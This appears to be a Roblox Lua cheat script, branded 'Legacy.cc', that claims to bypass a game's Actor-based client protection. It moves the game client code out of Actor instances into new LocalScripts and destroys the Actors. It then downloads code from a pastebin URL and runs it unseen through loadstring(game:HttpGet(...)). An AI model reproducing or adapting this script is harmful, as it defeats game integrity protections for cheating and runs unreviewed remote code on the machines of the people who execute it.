repeat
    wait()
until game:IsLoaded()

game.Players.LocalPlayer.PlayerGui.DescendantAdded:Connect(function(Actorr)
    if Actorr:IsA('Actor') then
        local Sc = Instance.new('LocalScript', Actorr.Parent)
        Sc.Name = Actorr.Name

        local gameClient = Actorr:FindFirstChild("GameClient")
        if gameClient then
            gameClient.Parent = Sc
        end

        spawn(function()
            wait(1)
            if Actorr and Actorr.Parent then
                Actorr:Destroy()
            end
        end)

        Actorr.ChildAdded:Connect(function(Added)
            task.wait()
            Added.Parent = Sc
        end)

        local hackedScript = Instance.new("LocalScript", Sc)
        hackedScript.Name = "Bypassed"
    end
end)

task.wait(1)
warn("Legacy.cc | PUBLIC | BETA | V0.01: ACOTR BYPASSED")
loadstring(game:HttpGet('https://pastebin.com/raw/52Wqbp9s'))()
showNotification("Actors Bypassed", "Made by: JOE#9059", 3)
